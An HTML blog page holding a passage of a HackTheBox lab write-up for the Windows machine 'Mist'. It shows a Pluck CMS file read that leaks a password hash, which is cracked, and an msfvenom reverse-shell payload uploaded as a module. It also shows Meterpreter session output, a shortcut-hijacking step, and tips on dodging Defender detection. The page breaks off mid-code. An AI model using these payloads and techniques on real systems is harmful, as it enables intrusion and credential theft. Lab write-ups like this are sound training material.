<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Foued SAIDI">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://foued-saidi.tech/2024/10/25/hackthebox-mist/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="OverviewMist is an insane-difficulty Windows HackTheBox machine. It starts off with a File Read vulnerability in Pluck version v4.7.18 to leak admin password and get a hold of a system shell by upload">
<meta property="og:type" content="article">
<meta property="og:title" content="Hackthebox: Mist">
<meta property="og:url" content="http://foued-saidi.tech/2024/10/25/Hackthebox-Mist/index.html">
<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
<meta property="og:description" content="OverviewMist is an insane-difficulty Windows HackTheBox machine. It starts off with a File Read vulnerability in Pluck version v4.7.18 to leak admin password and get a hold of a system shell by upload">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Mist/Mist.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Mist/web.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Mist/pluck_login.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Mist/ferox1.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Mist/Ferox.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Mist/hash.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Mist/pluck.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Mist/priv.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Mist/priv2.png">
<meta property="article:published_time" content="2024-10-25T13:15:02.000Z">
<meta property="article:modified_time" content="2024-10-26T15:43:09.496Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Mist/Mist.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#5618ff">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            Hackthebox: Mist -
        
        Foued Saidi&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Foued Saidi&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/about">ME</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Mist</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/logo.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-10-25 14:15:02</span>
        <span class="mobile">2024-10-25 14:15:02</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-10-26 16:43:09</span>
            <span class="mobile">2024-10-26 16:43:09</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Mist is an insane-difficulty Windows HackTheBox machine. It starts off with a File Read vulnerability in Pluck version v4.7.18 to leak admin password and get a hold of a system shell by uploading a malicious module. Then there’s a directory with links in it that we can abuse for a phishing attack to pivot to another user. Atfer that, we can find that LDAP signing is off so we could PetitPotam to coerce the server and then add shadow credentials to the machine account on the webserver to access local admin. Later finding a KeePass Database to do a pattern hash cracking and obtain its’ password. Finally, move on from there, read GMSA password, abuse AddKeyCredentialLink and exploit ADCS ESC13.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Mist/Mist.png"
                      alt="Mist-info-card"
                ><figcaption>Mist-info-card</figcaption></figure></p>
<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">128.221</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-10-25</span> <span class="number">16</span>:<span class="number">41</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">128.221</span></span><br><span class="line">Host is up (<span class="number">1.0</span>s latency).</span><br><span class="line">Not shown: <span class="number">999</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span>.<span class="number">52</span> ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>m PHP/<span class="number">8.1</span>.<span class="number">1</span>)</span><br><span class="line">| http<span class="literal">-robots</span>.txt: <span class="number">2</span> disallowed entries</span><br><span class="line">|_/<span class="keyword">data</span>/ /docs/</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">52</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>m PHP/<span class="number">8.1</span>.<span class="number">1</span></span><br><span class="line">| http<span class="literal">-cookie-flags</span>:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http<span class="literal">-title</span>: Mist - Mist</span><br><span class="line">|_Requested resource was http://<span class="number">10.129</span>.<span class="number">128.221</span>/?file=mist</span><br><span class="line">|_http<span class="literal">-generator</span>: pluck <span class="number">4.7</span>.<span class="number">18</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">144.01</span> seconds</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt;</span><br></pre></td></tr></table></figure></div>

<p>We can see that we have only one open port which is 80, that has a web application running on it, so let’s check it out.</p>
<h4 id="Web-Application-http-mist-htb"><a href="#Web-Application-http-mist-htb" class="headerlink" title="Web Application - http://mist.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://mist.htb/" >http://mist.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Mist/web.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>One interesting thing about this interface is that it says that it’s powered by <a class="link"   target="_blank" rel="noopener" href="https://github.com/pluck-cms/pluck/" >Pluck CMS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and we also have a redirect to a <code>login.php</code> once we click on “admin”:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Mist/pluck_login.png"
                      alt="Pluck Login"
                ><figcaption>Pluck Login</figcaption></figure></p>
<p>Yet we still do not have a password for that.</p>
<h5 id="Local-File-Read-http-mist-htb-data-modules-albums-albums-getimage-php"><a href="#Local-File-Read-http-mist-htb-data-modules-albums-albums-getimage-php" class="headerlink" title="Local File Read - http://mist.htb/data/modules/albums/albums_getimage.php"></a>Local File Read - <a class="link"   target="_blank" rel="noopener" href="http://mist.htb/data/modules/albums/albums_getimage.php" >http://mist.htb/data/modules/albums/albums_getimage.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h5><p>During my initial recon phase, I used Feroxbuster to check for interesting directories and files and stumbled upon this one:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Mist/ferox1.png"
                      alt="Local File Read"
                ><figcaption>Local File Read</figcaption></figure></p>
<p>Checking this issue on Github will give us a good idea on how to proceed forward since it is specifying how we can include file and read them with being authenticated:<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/pluck-cms/pluck/issues/122" >https://github.com/pluck-cms/pluck/issues/122 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>One really interesting resource I found was <code>/data/settings/modules/albums/admin_backup.php</code>:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Mist/Ferox.png"
                      alt="Local File Read"
                ><figcaption>Local File Read</figcaption></figure></p>
<p>I tried to read the file by including the whole path but it did not work. However, when I only inserted the name of the file only I got a hit:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Mist/hash.png"
                      alt="Local File Read"
                ><figcaption>Local File Read</figcaption></figure></p>
<p>It looks like a password hash. I used <a class="link"   target="_blank" rel="noopener" href="https://crackstation.net/" >Crackstation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to rapidly get a password value and I got a hit for <code>lexypoo97</code></p>
<h4 id="Pluck-v4-7-18-Remote-Code-Execution-RCE"><a href="#Pluck-v4-7-18-Remote-Code-Execution-RCE" class="headerlink" title="Pluck v4.7.18 - Remote Code Execution (RCE)"></a>Pluck v4.7.18 - Remote Code Execution (RCE)</h4><p>I used that password to login into the Pluck instance we saw earlier and it was successful:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Mist/pluck.png"
                      alt="Pluck"
                ><figcaption>Pluck</figcaption></figure></p>
<p>Looking at the version displayed on the page footer <code>v4.7.18</code>, I searched for any public exploits and stumbled upon <a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51592" >this one <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. The steps are as follows:<br>1- Create a php&#x2F;meterpreter_reverse_tcp payload using <code>msfvenom</code>: <code>msfvenom -p php/meterpreter_reverse_tcp -f raw LHOST=10.10.x.x LPORT=4444 -o kujen.php</code><br>2- Zip that to <code>kujen.zip</code><br>3- upload it by navigating to <code>Options =&gt; Manage Modules =&gt; Install Module</code><br>4- Navigate to <code>http://mist.htb/data/modules/kujen/kujen.php</code><br>5- Get a reverse shell session on msfconsole:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.x.x:4444 </span><br><span class="line">[*] Meterpreter session 1 opened (10.10.x.x:4444 -&gt; 10.129.128.221:49975) at 2024-10-25 13:33:31 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: svc_web</span><br></pre></td></tr></table></figure></div>

<p>And we are in!!<br>First step now is to get a new reverse shell using <code>windows/x64/meterpreter/reverse_tcp</code> because the PHP one will not allow us to keep working comfortably, so I’ll just create a new payload and get my reverse shell:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.x.x:4455 </span><br><span class="line">[*] Sending stage (201798 bytes) to 10.129.128.221</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.x.x:4455 -&gt; 10.129.128.221:49895) at 2024-10-25 13:42:44 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; <span class="built_in">ls</span></span><br><span class="line">Listing: C:\xampp\htdocs\data\modules\kujen</span><br><span class="line">===========================================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100777/rwxrwxrwx  7168   fil   2024-10-25 13:46:44 -0400  kujen.exe</span><br><span class="line">100666/rw-rw-rw-  34849  fil   2024-10-25 13:46:23 -0400  kujen.php</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And now we can keep going forward :) </p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; net view \\MS01</span><br><span class="line">net view \\MS01</span><br><span class="line">Shared resources at \\MS01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Share name           <span class="built_in">Type</span>  Used as  Comment  </span><br><span class="line"></span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Common Applications  Disk                    </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure></div>

<p>The “Common Applications” folder should not exist since it doesn’t in the initial installation of a windows system.<br>Checking it, I find some interesting “.lnk” files. <a class="link"   target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk" >This article <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> was really helpful for me to abuse a popular phishing technique where attackers embed .lnk files into the Office documents and camouflage them with Ms Word office icons in order to deceive victims to click and run them. </p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\data\modules\kujen&gt; <span class="variable">$objShell</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> WScript.Shell</span><br><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\data\modules\kujen&gt; <span class="variable">$lnk</span> = <span class="variable">$objShell</span>.CreateShortcut(<span class="string">&quot;c:\Common Applications\Calculator.lnk&quot;</span>)   </span><br><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\data\modules\kujen&gt; <span class="variable">$lnk</span>.TargetPath = <span class="string">&quot;C:\xampp\htdocs\files\kujen.exe&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\data\modules\kujen&gt;  <span class="variable">$lnk</span>.Save()</span><br><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\data\modules\kujen&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>PS: I tried for a long time to upload my “kujen.exe” again, but it got detected each time. Therefore I searched for a whitelisted folder that would not trigger the detection (which is something everyone should do) and the &#x2F;files folder made sense to me since it’s a file directory and detections would be less on it. And that was actuall the case for me :)<br>We could also search for defender exclusions, <a class="link"   target="_blank" rel="noopener" href="https://blog.fndsec.net/2024/10/04/uncovering-exclusion-paths-in-microsoft-defender-a-security-research-insight/" >this article <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> explains it well.</p>
<p>And we got our reverse shell for the “MIST\Brandon.Keywarp” user:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.x.x:4455 </span><br><span class="line">[*] Sending stage (201798 bytes) to 10.129.128.221</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.x.x:4455 -&gt; 10.129.128.221:49983) at 2024-10-25 14:24:49 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: MIST\Brandon.Keywarp</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="Certificate-service-to-obtain-MIST-brandon-keywrap-NTLM-hash"><a href="#Certificate-service-to-obtain-MIST-brandon-keywrap-NTLM-hash" class="headerlink" title="Certificate service to obtain MIST\brandon.keywrap NTLM hash:"></a>Certificate service to obtain MIST\brandon.keywrap NTLM hash:</h4><p>We will requesting a user certificate from the CA “mist-DC01-CA” on the server “DC01”:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 